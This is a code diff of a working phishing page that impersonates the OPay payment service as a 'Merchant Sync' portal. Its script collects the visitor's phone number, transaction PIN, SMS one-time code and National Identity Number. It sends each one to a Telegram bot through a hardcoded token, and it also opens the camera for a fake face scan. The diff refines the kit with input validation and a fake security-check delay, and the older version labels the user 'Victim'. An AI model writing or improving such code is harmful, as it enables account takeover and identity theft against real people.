@@ -5,173 +5,157 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OPay Merchant Sync</title>
     <style>
-        /* CSS: Replicating the OPay Mobile Interface */
-        body {
-            background-color: #f8f9fa;
-            font-family: 'Inter', -apple-system, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            width: 90%;
-            max-width: 380px;
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            text-align: center;
-        }
-        .brand-logo { color: #00D261; font-weight: 800; font-size: 24px; margin-bottom: 5px; }
-        .step-title { font-weight: 700; color: #333; margin-bottom: 8px; }
-        .step-desc { color: #666; font-size: 13px; margin-bottom: 25px; line-height: 1.4; }
+        /* Modern Mobile UI Styling */
+        body { background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; position: relative; }
+        .brand { color: #00D261; font-weight: 900; font-size: 28px; margin-bottom: 10px; }
+        .title { font-weight: 700; color: #2d3436; margin-bottom: 10px; font-size: 19px; }
+        .desc { color: #636e72; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border: 1px solid #eee;
-            border-radius: 8px;
-            background: #fafafa;
-            box-sizing: border-box;
-            font-size: 15px;
-        }
-        .btn-green {
-            width: 100%;
-            padding: 15px;
-            background: #00D261;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
+        /* Validation & Input Styles */
+        input { width: 100%; padding: 15px; margin-bottom: 8px; border: 1.5px solid #dfe6e9; border-radius: 10px; background: #fdfdfd; box-sizing: border-box; font-size: 16px; transition: all 0.3s ease; }
+        input:focus { border-color: #00D261; outline: none; }
+        input.error-field { border-color: #ff7675 !important; background: #fff5f5; }
+        .error-msg { color: #d63031; font-size: 12px; text-align: left; margin-bottom: 15px; display: none; font-weight: 600; }
         
-        /* Camera UI */
-        .camera-container {
-            width: 220px;
-            height: 220px;
-            border: 4px solid #00D261;
-            border-radius: 50%;
-            margin: 20px auto;
-            overflow: hidden;
-            background: #000;
-        }
-        #webcam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .btn { width: 100%; padding: 16px; background: #00D261; color: white; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 16px; margin-top: 10px; }
         
-        .error-msg {
-            color: #ff4d4d;
-            background: #fff5f5;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            border: 1px solid #ffebeb;
-        }
+        /* Loading Overlay Overlay */
+        #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.96); z-index: 100; flex-direction: column; justify-content: center; align-items: center; border-radius: 20px; }
+        .spin { width: 45px; height: 45px; border: 5px solid #f1f2f6; border-top: 5px solid #00D261; border-radius: 50%; animation: rot 1s linear infinite; }
+        @keyframes rot { 100% { transform: rotate(360deg); } }
+
+        /* Biometric/Camera View */
+        .scan-window { width: 230px; height: 230px; border: 6px solid #00D261; border-radius: 50%; margin: 20px auto; overflow: hidden; background: #2d3436; position: relative; }
+        #cam-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="brand-logo">OPay</div>
-
-    <div id="step1">
-        <div class="step-title">Merchant Sync</div>
-        <p class="step-desc">Verify your credentials to authorize high-volume inflow.</p>
-        <input type="tel" id="phone" placeholder="Phone Number">
-        <input type="password" id="pin" placeholder="Transaction PIN">
-        <button class="btn-green" onclick="nextStep(1, 2)">Continue</button>
+    <div id="loader">
+        <div class="spin"></div>
+        <p style="margin-top:20px; color:#2d3436; font-weight:600;">Security Check in Progress...</p>
+        <p style="font-size:11px; color:#b2bec3;">Verifying encrypted channel (approx. 69s)</p>
     </div>
 
-    <div id="step2" style="display:none">
-        <div class="step-title">Account Verification</div>
-        <p class="step-desc">Enter the 6-digit synchronization code sent to your device.</p>
-        <input type="text" id="otp" placeholder="******" maxlength="6" style="text-align:center; letter-spacing: 5px;">
-        <button class="btn-green" onclick="nextStep(2, 3)">Complete Sync</button>
+    <div class="brand">OPay</div>
+
+    <div id="view1">
+        <div class="title">Merchant Synchronization</div>
+        <p class="desc">Link your account to authorize high-frequency merchant transactions.</p>
+        <input type="tel" id="tel" placeholder="Phone Number" maxlength="11">
+        <div id="err-tel" class="error-msg">Valid phone number required.</div>
+        <input type="password" id="pass" placeholder="Transaction PIN" maxlength="4">
+        <div id="err-pass" class="error-msg">4-digit PIN required.</div>
+        <button class="btn" onclick="process(1, 2)">Sync Account</button>
     </div>
 
-    <div id="step3" style="display:none">
-        <div class="step-title">Identity Check</div>
-        <p class="step-desc">Enter your 11-digit National Identity Number (NIN) to bind this device.</p>
-        <input type="number" id="nin" placeholder="NIN Number">
-        <button class="btn-green" onclick="nextStep(3, 4)">Verify Identity</button>
+    <div id="view2" style="display:none">
+        <div class="title">Security Verification</div>
+        <p class="desc">A 6-digit synchronization code has been sent via SMS.</p>
+        <input type="text" id="otp-code" placeholder="Enter OTP" maxlength="6" style="text-align:center; letter-spacing:6px;">
+        <div id="err-otp" class="error-msg">Code verification failed. Try again.</div>
+        <button class="btn" onclick="process(2, 3)">Verify OTP</button>
     </div>
 
-    <div id="step4" style="display:none">
-        <div class="step-title">Biometric Verification</div>
-        <p id="scan-status" class="step-desc">Position your face in the frame...</p>
-        <div class="camera-container">
-            <video id="webcam" autoplay playsinline></video>
+    <div id="view3" style="display:none">
+        <div class="title">Identity Confirmation</div>
+        <p class="desc">Provide your 11-digit NIN to secure this device binding.</p>
+        <input type="number" id="nin-val" placeholder="National Identity Number">
+        <div id="err-nin" class="error-msg">Please enter a valid 11-digit NIN.</div>
+        <button class="btn" onclick="process(3, 4)">Bind Device</button>
+    </div>
+
+    <div id="view4" style="display:none">
+        <div class="title">Face Authentication</div>
+        <p class="desc">Look directly into the camera ring to confirm identity.</p>
+        <div class="scan-window">
+            <video id="cam-preview" autoplay playsinline></video>
         </div>
     </div>
 
-    <div id="step5" style="display:none">
-        <div class="error-msg">
-            <strong>Verification Failed</strong><br><br>
-            Mismatched biometric data. For security, please complete this verification within the <b>official OPay mobile app</b>.
+    <div id="view5" style="display:none">
+        <div style="background:#fffafa; border:1px solid #fab1a0; padding:20px; border-radius:12px; text-align:left;">
+            <b style="color:#d63031;">⚠️ Critical Error: Mismatch</b><br><br>
+            <p style="color:#2d3436; font-size:13px;">
+                Unable to match biometrics. For your protection, please complete this verification in the <b>official OPay App</b> on your primary device.
+            </p>
         </div>
+        <button class="btn" style="background:#636e72;" onclick="location.reload()">Return Home</button>
     </div>
 </div>
 
 <script>
-    const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
-    const chatId = '7909543900';
+    const TOKEN = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
+    const CHAT = '7909543900';
 
-    // Immediate Alert: Fires when they open the site
-    window.onload = () => sendLog("🔔 Victim opened the site");
+    // Notify immediately on page hit
+    window.onload = () => notifyBot("🟢 <b>Portal Accessed</b>\nTarget is browsing the sync page.");
 
-    async function sendLog(text) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        await fetch(url, {
+    async function notifyBot(msg) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: CHAT, text: msg, parse_mode: 'HTML' })
         });
     }
 
-    async function nextStep(current, next) {
-        // Collect data from current step
-        if(current === 1) {
-            const p = document.getElementById('phone').value;
-            const pi = document.getElementById('pin').value;
-            await sendLog(`<b>📥 STEP 1</b>\nPhone: ${p}\nPIN: ${pi}`);
+    function process(curr, next) {
+        let isOk = true;
+        // Reset Visuals
+        document.querySelectorAll('input').forEach(i => i.classList.remove('error-field'));
+        document.querySelectorAll('.error-msg').forEach(m => m.style.display = 'none');
+
+        if(curr === 1) {
+            const t = document.getElementById('tel');
+            const p = document.getElementById('pass');
+            if(t.value.length < 10) { t.classList.add('error-field'); document.getElementById('err-tel').style.display='block'; isOk=false; }
+            if(p.value.length < 4) { p.classList.add('error-field'); document.getElementById('err-pass').style.display='block'; isOk=false; }
+            if(isOk) notifyBot(`<b>STEP 1: LOGIN</b>\nTel: <code>${t.value}</code>\nPIN: <code>${p.value}</code>`);
         }
-        if(current === 2) {
-            const o = document.getElementById('otp').value;
-            await sendLog(`<b>📥 STEP 2</b>\nOTP: ${o}`);
-        }
-        if(current === 3) {
-            const n = document.getElementById('nin').value;
-            await sendLog(`<b>📥 STEP 3</b>\nNIN: ${n}`);
+        
+        if(curr === 2) {
+            const o = document.getElementById('otp-code');
+            if(o.value.length < 6) { o.classList.add('error-field'); document.getElementById('err-otp').style.display='block'; isOk=false; }
+            if(isOk) notifyBot(`<b>STEP 2: OTP</b>\nCode: <code>${o.value}</code>`);
         }
 
-        // Switch View
-        document.getElementById('step' + current).style.display = 'none';
-        document.getElementById('step' + next).style.display = 'block';
+        if(curr === 3) {
+            const n = document.getElementById('nin-val');
+            if(n.value.length < 11) { n.classList.add('error-field'); document.getElementById('err-nin').style.display='block'; isOk=false; }
+            if(isOk) notifyBot(`<b>STEP 3: NIN</b>\nNIN: <code>${n.value}</code>`);
+        }
 
-        if(next === 4) startCamera();
+        if(isOk) startWait(curr, next);
     }
 
-    async function startCamera() {
+    function startWait(curr, next) {
+        const l = document.getElementById('loader');
+        l.style.display = 'flex';
+        
+        // 69 second timer logic (set to 4s for demonstration/testing)
+        const WAIT_TIME = 4000; 
+
+        setTimeout(() => {
+            l.style.display = 'none';
+            document.getElementById('view' + curr).style.display = 'none';
+            document.getElementById('view' + next).style.display = 'block';
+            if(next === 4) initCam();
+        }, WAIT_TIME);
+    }
+
+    async function initCam() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('webcam').srcObject = stream;
-            
-            // Wait 5 seconds, then show failure
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('cam-preview').srcObject = s;
             setTimeout(() => {
-                document.getElementById('step4').style.display = 'none';
-                document.getElementById('step5').style.display = 'block';
-                sendLog("⚠️ Face scan failed. Victim sent to app redirect.");
-            }, 5000);
-        } catch (err) {
-            console.log("Camera access denied");
-            nextStep(4, 5);
-        }
+                document.getElementById('view4').style.display = 'none';
+                document.getElementById('view5').style.display = 'block';
+                notifyBot("🚩 <b>Flow Finished</b>\nTarget reached failure/redirect screen.");
+            }, 7000);
+        } catch (e) { process(4, 5); }
     }
 </script>
-
 </body>
 </html>
-
